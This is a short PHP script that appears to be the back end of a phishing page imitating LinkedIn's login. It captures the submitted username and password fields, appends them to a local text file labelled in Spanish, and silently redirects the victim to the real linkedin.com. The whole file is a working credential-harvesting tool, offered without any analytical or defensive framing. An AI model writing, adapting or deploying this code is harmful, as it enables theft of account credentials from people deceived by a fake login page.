<?php

file_put_contents("datos.txt", "Usuario: " . $_POST['session_key'] . " Clave: " . $_POST['session_password'] . "\n", FILE_APPEND);
header('Location: https://linkedin.com');
exit();
